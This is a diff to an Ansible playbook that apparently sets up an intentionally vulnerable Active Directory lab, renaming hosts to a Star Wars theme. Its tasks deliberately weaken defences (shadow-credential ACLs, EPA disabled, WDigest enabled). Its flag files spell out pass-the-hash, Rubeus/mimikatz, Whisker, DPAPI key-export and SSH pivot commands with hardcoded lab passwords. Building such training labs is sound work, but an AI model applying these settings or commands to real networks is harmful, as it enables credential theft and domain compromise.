@@ -5,14 +5,14 @@
 # ==============================================================================
 
 # LAT-036: Shadow Credentials (PKINIT + msDS-KeyCredentialLink write)
-- name: LAT-036 - Configure Shadow Credentials surface (dc01 only — ADSI write)
+- name: LAT-036 - Configure Shadow Credentials surface (coruscant only — ADSI write)
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    # Ensure helpdesk group has WriteProperty on msDS-KeyCredentialLink for ws01$
+    # Ensure helpdesk group has WriteProperty on msDS-KeyCredentialLink for tatooine$
     # GUID: 5b47d60f-aaf5-489f-9d47-6d34a3dc0a73 (KeyCredentialLink)
-    $computer = Get-ADComputer -Identity 'ws01' -ErrorAction SilentlyContinue
+    $computer = Get-ADComputer -Identity 'tatooine' -ErrorAction SilentlyContinue
     if (-not $computer) {
-      Write-Output "skipped: ws01 not found"
+      Write-Output "skipped: tatooine not found"
       exit 0
     }
     $helpdeskSid = (Get-ADGroup -Identity 'HelpDesk' -ErrorAction SilentlyContinue).SID
@@ -36,21 +36,21 @@
       )
       $acl.AddAccessRule($ace)
       Set-Acl -Path "AD:$($computer.DistinguishedName)" -AclObject $acl
-      Write-Output "changed: HelpDesk WriteProperty on KeyCredentialLink for ws01$"
+      Write-Output "changed: HelpDesk WriteProperty on KeyCredentialLink for tatooine$"
     }
   register: lat036_set
   changed_when: "'changed:' in lat036_set.stdout"
   failed_when: lat036_set.rc != 0
-  when: inventory_hostname == 'dc01.corp.local'
+  when: inventory_hostname == 'coruscant.empire.local'
 
 # LAT-041: NTLM relay target — disable Extended Protection for Authentication
-- name: LAT-041 - Disable EPA on file01 (NTLM relay surface)
+- name: LAT-041 - Disable EPA on scarif (NTLM relay surface)
   ansible.windows.win_regedit:
     path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters'
     name: ExtendedProtection
     data: 0
     type: dword
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
 
 # LAT-042: SMB signing verification (should already be disabled by vuln_lat_ext)
 - name: LAT-042 - Verify SMB signing disabled (lateral relay pre-req)
@@ -73,7 +73,7 @@
     name: UseLogonCredential
     data: 1
     type: dword
-  when: inventory_hostname in ['ws01.corp.local', 'file01.corp.local']
+  when: inventory_hostname in ['tatooine.empire.local', 'scarif.empire.local']
 
 # LAT-044: Credential Guard disabled (already in vuln_pe_extended — verify here)
 - name: LAT-044 - Verify Credential Guard disabled
@@ -87,7 +87,7 @@
   register: lat044_check
   changed_when: "'changed:' in lat044_check.stdout"
   failed_when: lat044_check.rc != 0
-  when: inventory_hostname in ['ws01.corp.local', 'file01.corp.local']
+  when: inventory_hostname in ['tatooine.empire.local', 'scarif.empire.local']
 
 # LAT-045: Pass-the-Hash via SMB (RCE surface — flat NTLM + no SMB signing)
 # LAT-046: Pass-the-Ticket via Rubeus/Mimikatz
@@ -104,8 +104,8 @@
         ==================================
         Pre-reqs: NTLM enabled (LmCompat=1, CRED-029), SMB signing off (LAT-042)
 
-        impacket-psexec CORP/Administrator@10.10.0.13 -hashes :$(ntlm_hash)
-        impacket-wmiexec CORP/svc_darryl@10.10.0.10 -hashes :$(ntlm_hash)
+        impacket-psexec EMPIRE/Administrator@10.10.0.13 -hashes :$(ntlm_hash)
+        impacket-wmiexec EMPIRE/svc_bobafett@10.10.0.10 -hashes :$(ntlm_hash)
         crackmapexec smb 10.10.0.0/24 -u Administrator -H $(ntlm_hash) -x "whoami"
 
     - path: 'C:\Flags\FLAG-LAT-047-OverPtH.txt'
@@ -114,21 +114,21 @@
         =======================================================
         Convert NT hash to Kerberos TGT — better OPSEC than PtH.
 
-        Rubeus asktgt /user:Administrator /rc4:$(ntlm_hash) /domain:corp.local /ptt
-        mimikatz# sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:$(hash)
+        Rubeus asktgt /user:Administrator /rc4:$(ntlm_hash) /domain:empire.local /ptt
+        mimikatz# sekurlsa::pth /user:Administrator /domain:empire.local /ntlm:$(hash)
 
     - path: 'C:\Flags\FLAG-LAT-048-PtC.txt'
       content: |
         LAT-048: Pass-the-Certificate (Shadow Credentials PKINIT)
         ===========================================================
-        1. HelpDesk group has WriteProperty on ms-DS-KeyCredentialLink for ws01$
-        2. Write attacker public key to ws01$ KeyCredentialLink attribute
-        3. Use PKINIT with the key pair to get ws01$ TGT
-        4. Pivot to ws01 as SYSTEM via S4U2Self
+        1. HelpDesk group has WriteProperty on ms-DS-KeyCredentialLink for tatooine$
+        2. Write attacker public key to tatooine$ KeyCredentialLink attribute
+        3. Use PKINIT with the key pair to get tatooine$ TGT
+        4. Pivot to tatooine as SYSTEM via S4U2Self
 
         Tools:
-          Whisker.exe add /target:ws01$ /domain:corp.local /dc:dc01
-          Rubeus asktgt /user:ws01$ /certificate:$(b64cert) /ptt
+          Whisker.exe add /target:tatooine$ /domain:empire.local /dc:coruscant
+          Rubeus asktgt /user:tatooine$ /certificate:$(b64cert) /ptt
 
     - path: 'C:\Flags\FLAG-LAT-061-DPAPILat.txt'
       content: |
@@ -142,16 +142,16 @@
           dpapi::cred /in:$(credential_file)
 
         DPAPI backup key extraction:
-          impacket-dpapi backupkeys --export -t corp.local/Administrator:DVADlab2024!@10.10.0.10
+          impacket-dpapi backupkeys --export -t empire.local/Administrator:SithLord123!@10.10.0.10
 
     - path: 'C:\Flags\FLAG-LAT-070-SSHLat.txt'
       content: |
-        LAT-070: SSH Lateral Movement (file01 — IA-085)
+        LAT-070: SSH Lateral Movement (scarif — IA-085)
         =================================================
-        file01.corp.local has OpenSSH with password auth enabled.
-        Default lab password: DVADlab2024!
+        scarif.empire.local has OpenSSH with password auth enabled.
+        Default lab password: SithLord123!
 
         ssh Administrator@10.10.0.13
         scp malware.exe Administrator@10.10.0.13:C:\Tools\
-        ssh -L 3389:10.10.0.10:3389 Administrator@10.10.0.13  # tunnel RDP to dc01
-  when: inventory_hostname in ['dc01.corp.local', 'file01.corp.local', 'ws01.corp.local']
+        ssh -L 3389:10.10.0.10:3389 Administrator@10.10.0.13  # tunnel RDP to coruscant
+  when: inventory_hostname in ['coruscant.empire.local', 'scarif.empire.local', 'tatooine.empire.local']
